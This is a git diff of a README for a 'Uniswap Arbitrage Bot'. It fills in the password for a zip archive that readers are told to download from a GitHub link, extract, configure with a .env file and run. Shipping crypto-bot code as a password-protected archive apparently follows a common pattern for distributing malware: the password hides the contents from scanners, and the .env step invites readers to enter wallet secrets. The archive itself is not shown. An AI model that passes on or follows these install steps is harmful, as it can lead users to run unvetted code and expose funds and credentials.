@@ -11,7 +11,7 @@ The Uniswap Arbitrage Bot is a tool for rapid development of arbitrage strategie
 
 # Installation
 Follow these steps to set up and run the Uniswap Arbitrage Bot on your local machine:
- - [Clone](https://github.com/exileqeq/degen-bot-v2/archive/refs/heads/main.zip) the repository release and extract files with password `xxxxx`.
+ - [Clone](https://github.com/exileqeq/degen-bot-v2/archive/refs/heads/main.zip) the repository release and extract files with password `7sRifE9z1E`.
 - Create a `.env file` in the project's root directory and define your environment variables. You can use the `.env.example file` as a template.
 - Start the bot.
 
